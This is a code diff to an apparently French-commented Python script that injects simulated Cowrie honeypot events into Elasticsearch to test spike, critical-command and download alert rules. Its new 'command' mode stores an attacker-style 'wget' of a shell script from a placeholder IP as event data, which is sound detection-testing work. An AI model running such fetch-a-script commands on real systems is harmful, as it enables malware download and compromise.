@@ -1,4 +1,5 @@
 import json
+import os
 import random
 import sys
 import uuid
@@ -6,7 +7,8 @@ from datetime import datetime, timedelta, timezone
 
 import requests
 
-ES = "http://localhost:9200"
+ES = os.getenv("ES_URL", "http://localhost:9200")
+AUTH = (os.getenv("ES_USER", "elastic"), os.getenv("ELASTIC_PASSWORD", ""))
 
 # IP publiques variées (uniquement pour tester la géolocalisation)
 IPS = [
@@ -44,6 +46,9 @@ def session_events(ip, minute):
             cmd = random.choice(COMMANDS)
             events.append({**base, "eventid": "cowrie.command.input", "@timestamp": ts(minute),
                            "command_input": cmd, "message": f"CMD: {cmd}"})
+        if random.random() < 0.3:
+            events.append({**base, "eventid": "cowrie.session.file_download", "@timestamp": ts(minute),
+                           "url": "http://198.51.100.7/bot.sh", "shasum": uuid.uuid4().hex * 2})
     return events
 
 
@@ -56,6 +61,7 @@ def bulk(events):
         f"{ES}/{stream}/_bulk?pipeline=cowrie-geoip",
         data="\n".join(lines) + "\n",
         headers={"Content-Type": "application/x-ndjson"},
+        auth=AUTH,
         timeout=30,
     )
     res = r.json()
@@ -86,9 +92,31 @@ def burst(ip=None, count=30):
     bulk(events)
 
 
+def spike(count=1500):
+    """Pic d'activité : beaucoup d'événements dans l'heure en cours (règle activity_spike)."""
+    events = []
+    for _ in range(count // 3):
+        events += session_events(random.choice(IPS), random.randint(0, 50))[:3]
+    bulk(events)
+
+
+def command():
+    """Une session avec commande dangereuse + dépôt de fichier (règles critique et téléchargement)."""
+    ip = random.choice(IPS)
+    base = {"src_ip": ip, "session": uuid.uuid4().hex[:12], "simulated": True, "@timestamp": ts(0)}
+    bulk([{**base, "eventid": "cowrie.command.input", "command_input": "wget http://198.51.100.7/x.sh"},
+          {**base, "eventid": "cowrie.session.file_download", "url": "http://198.51.100.7/x.sh",
+           "shasum": uuid.uuid4().hex * 2}])
+
+
 if __name__ == "__main__":
+    # usage : simulate_attacks.py [spread N | burst | spike | command]
     mode = sys.argv[1] if len(sys.argv) > 1 else "spread"
     if mode == "burst":
         burst()
+    elif mode == "spike":
+        spike()
+    elif mode == "command":
+        command()
     else:
         spread(int(sys.argv[2]) if len(sys.argv) > 2 else 60)
